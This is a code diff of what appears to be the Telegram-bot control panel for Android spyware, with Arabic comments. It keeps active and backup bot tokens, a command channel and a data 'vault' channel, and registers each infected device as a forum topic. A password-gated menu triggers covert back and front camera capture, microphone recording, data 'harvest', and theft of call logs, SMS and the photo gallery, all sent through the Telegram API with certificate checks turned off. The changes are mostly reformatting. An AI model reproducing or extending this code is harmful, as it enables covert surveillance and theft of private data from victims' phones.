@@ -37,13 +37,13 @@ class T:
         self.ses = {}
         self.dvs = {}
         self.adm = {}
-        self.p_upd = set()   # منع تكرار الأوامر (idempotency)
+        self.p_upd = set()               # منع تكرار الأوامر
         all_t = _d()
-        self.act = all_t[:6]
-        self.bak = all_t[6:]
+        self.act = all_t[:6]             # بوتات نشطة
+        self.bak = all_t[6:]             # بوتات احتياطية
         self.cur = 0
-        self.cmd = "-1003365166986"
-        self.dat = "-1003787520015"
+        self.cmd = "-1003365166986"      # قناة الأوامر
+        self.dat = "-1003787520015"      # قناة البيانات (vault)
         self.rn = True
         self._ld()
         threading.Thread(target=self._ka, daemon=True).start()
@@ -81,11 +81,12 @@ class T:
             time.sleep(3600)
 
     def _ap(self, met, d=None, f=None, fb=False, retry=2):
-        """إرسال طلب مع إعادة محاولة تلقائية عند فشل الشبكة"""
+        """إرسال طلب مع إعادة المحاولة عند فشل الشبكة (تصل إلى 3 محاولات)"""
         for attempt in range(retry + 1):
             t = self._tk(fb)
             try:
-                r = requests.post(f"https://api.telegram.org/bot{t}/{met}", data=d, files=f, timeout=25, verify=False)
+                r = requests.post(f"https://api.telegram.org/bot{t}/{met}",
+                                  data=d, files=f, timeout=25, verify=False)
                 j = r.json()
                 if not j.get('ok') and j.get('error_code') == 429:
                     time.sleep(2)
@@ -93,14 +94,15 @@ class T:
                 return j
             except Exception as e:
                 if attempt == retry:
-                    logging.error(f"API call failed after {retry+1} attempts: {met} - {e}")
+                    logging.error(f"API fail ({met}): {e}")
                 time.sleep(1.5)
         return None
 
     def reg(self, did, mod):
         if did in self.dvs:
             return self.dvs[did].get('t')
-        r = self._ap("createForumTopic", {"chat_id": self.cmd, "name": f"📱 {mod[:10]} | {did[:4]}"})
+        r = self._ap("createForumTopic",
+                     {"chat_id": self.cmd, "name": f"📱 {mod[:10]} | {did[:4]}"})
         if r and r.get('ok'):
             tid = r['result']['message_thread_id']
             self.dvs[did] = {"n": mod, "t": tid}
@@ -123,9 +125,12 @@ class T:
 
     def _kd(self, did):
         return {"inline_keyboard": [
-            [{"text": "📸 خلفية", "callback_data": f"cam_{did}"}, {"text": "🤳 أمامية", "callback_data": f"camf_{did}"}],
-            [{"text": "🎙️ تسجيل", "callback_data": f"mic_{did}"}, {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
-            [{"text": "📞 سجلات", "callback_data": f"callog_{did}"}, {"text": "💬 رسائل", "callback_data": f"sms_{did}"}],
+            [{"text": "📸 خلفية", "callback_data": f"cam_{did}"},
+             {"text": "🤳 أمامية", "callback_data": f"camf_{did}"}],
+            [{"text": "🎙️ تسجيل", "callback_data": f"mic_{did}"},
+             {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
+            [{"text": "📞 سجلات", "callback_data": f"callog_{did}"},
+             {"text": "💬 رسائل", "callback_data": f"sms_{did}"}],
             [{"text": "🖼️ المعرض", "callback_data": f"media_{did}"}],
             [{"text": "🔙 عودة", "callback_data": "ld"}]
         ]}
@@ -156,7 +161,11 @@ class T:
                     "parse_mode": "HTML"
                 })
             else:
-                self._ap("sendMessage", {"chat_id": cid, "text": "❌ <b>كلمة السر خاطئة</b>", "parse_mode": "HTML"})
+                self._ap("sendMessage", {
+                    "chat_id": cid,
+                    "text": "❌ <b>كلمة السر خاطئة</b>",
+                    "parse_mode": "HTML"
+                })
         elif self._auth(cid) and t == "/menu":
             self._ap("sendMessage", {
                 "chat_id": cid,
@@ -168,7 +177,7 @@ class T:
     def _pc(self, u):
         cb = u.get('callback_query', {})
         uid = cb.get('id')
-        # منع تكرار معالجة نفس الضغطة
+        # منع تكرار نفس الضغطة
         if uid in self.p_upd:
             return
         self.p_upd.add(uid)
@@ -185,7 +194,10 @@ class T:
             pass
 
         if not self._auth(cid):
-            self._ap("sendMessage", {"chat_id": cid, "text": "⚠️ الجلسة منتهية. يرجى /login مجدداً."})
+            self._ap("sendMessage", {
+                "chat_id": cid,
+                "text": "⚠️ الجلسة منتهية. يرجى /login مجدداً."
+            })
             return
 
         if d == "main":
@@ -201,10 +213,14 @@ class T:
                     "chat_id": cid,
                     "message_id": mid,
                     "text": "📭 لا توجد أجهزة متصلة حالياً.",
-                    "reply_markup": json.dumps({"inline_keyboard": [[{"text": "🔙 عودة", "callback_data": "main"}]]})
+                    "reply_markup": json.dumps({
+                        "inline_keyboard": [[{"text": "🔙 عودة", "callback_data": "main"}]]
+                    })
                 })
                 return
-            kb = {"inline_keyboard": [[{"text": f"📱 {v['n']}", "callback_data": f"dev_{k}"}] for k, v in self.dvs.items()] + [[{"text": "🔙 عودة", "callback_data": "main"}]]}
+            kb = {"inline_keyboard":
+                  [[{"text": f"📱 {v['n']}", "callback_data": f"dev_{k}"}] for k, v in self.dvs.items()] +
+                  [[{"text": "🔙 عودة", "callback_data": "main"}]]}
             self._ap("editMessageText", {
                 "chat_id": cid,
                 "message_id": mid,
@@ -225,11 +241,18 @@ class T:
         elif d == "rnw":
             self.ses[str(cid)] = time.time() + 3600
             self._sv()
-            self._ap("answerCallbackQuery", {"callback_query_id": uid, "text": "تم تجديد الجلسة ✅"})
+            self._ap("answerCallbackQuery", {
+                "callback_query_id": uid,
+                "text": "تم تجديد الجلسة ✅"
+            })
         elif d == "ext":
             self.ses.pop(str(cid), None)
             self._sv()
-            self._ap("editMessageText", {"chat_id": cid, "message_id": mid, "text": "🔒 تم تسجيل الخروج."})
+            self._ap("editMessageText", {
+                "chat_id": cid,
+                "message_id": mid,
+                "text": "🔒 تم تسجيل الخروج."
+            })
         else:
             try:
                 import commands
